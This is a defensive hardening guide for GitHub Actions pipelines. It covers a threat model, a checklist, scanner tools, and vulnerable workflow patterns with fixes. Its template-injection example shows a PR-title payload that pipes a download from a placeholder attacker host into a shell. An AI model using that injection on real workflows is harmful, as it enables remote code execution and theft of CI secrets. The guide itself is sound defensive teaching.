# CI/CD Hardening — GitHub Actions

## Threat model
1. **Poisoned pipeline execution** — attacker pushes a PR that runs in a
   privileged context (`pull_request_target`) and steals secrets
2. **Compromised third-party action** — `actions/foo@v3` tag rewritten to a
   malicious commit
3. **Artifact poisoning** — built artifact tampered before deploy
4. **Secret exfiltration via build logs** — `echo $SECRET >> log`
5. **Self-hosted runner takeover** — runner not ephemeral, leaves credentials

## Hardening checklist
- [ ] `permissions: {}` at workflow root (deny by default), then grant per job
- [ ] All third-party actions pinned to full 40-char commit SHA
- [ ] No `pull_request_target` unless explicitly required AND no checkout of
      PR code AND no secrets exposed
- [ ] No `issue_comment` triggers running attacker-controlled code
- [ ] OIDC to cloud (AWS/GCP/Azure) instead of long-lived secrets
- [ ] Secrets scoped to environments (`environment:` + reviewers required)
- [ ] Self-hosted runners are ephemeral (one job, one VM, destroyed after)
- [ ] `harden-runner` action enabled with egress allow-list
- [ ] No `${{ github.event.* }}` expansion into a shell command without
      sanitization (template injection)
- [ ] Branch protection: required reviews, required status checks, signed
      commits, no force-push, no admin bypass
- [ ] CODEOWNERS for `.github/workflows/` requires sec-team review

## Detect & fix

### Run Zizmor
```bash
pip install zizmor
zizmor .github/workflows/
```
Surfaces: template injection, dangerous triggers, unpinned actions,
untrusted checkout.

### Run Poutine
```bash
brew install boostsecurityio/tap/poutine
poutine analyze_local .
```
Surfaces: supply-chain risks, build-pipeline vulns.

### Run Actionlint
```bash
brew install actionlint
actionlint
```
Surfaces: syntax errors, runner compat issues.

### Auto-pin actions
```bash
# Using pinact (Go)
go install github.com/suzuki-shunsuke/pinact/cmd/pinact@latest
pinact run

# Or Frizbee
go install github.com/stacklok/frizbee@latest
frizbee actions .github/workflows/
```

## Common bad patterns (refuse to ship)

### ❌ Template injection
```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```
A PR title of `"; curl evil.com | sh; #` executes. **Fix:**
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"
```

### ❌ Untrusted checkout in privileged context
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test  # runs attacker code with secrets
```
**Fix:** use `pull_request` (no secrets) for tests, or check out PR code in
a sandbox without secrets.

### ❌ Unpinned action
```yaml
- uses: some-org/some-action@v1
```
**Fix:**
```yaml
- uses: some-org/some-action@e1c4ad...  # v1.2.3
```

### ❌ Plaintext cloud creds
```yaml
- run: aws s3 cp ...
  env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
```
**Fix:** OIDC role assumption.
```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123:role/gha
      aws-region: us-east-1
```

## harden-runner template
```yaml
- name: Harden Runner
  uses: step-security/harden-runner@<sha>
  with:
    egress-policy: block
    allowed-endpoints: >
      api.github.com:443
      github.com:443
      registry.npmjs.org:443
```

## Tools to keep installed
- Zizmor (Rust) — primary scanner
- pinact / Frizbee — auto-pinner
- Actionlint — pre-commit hook
- gitleaks — pre-push hook for secrets
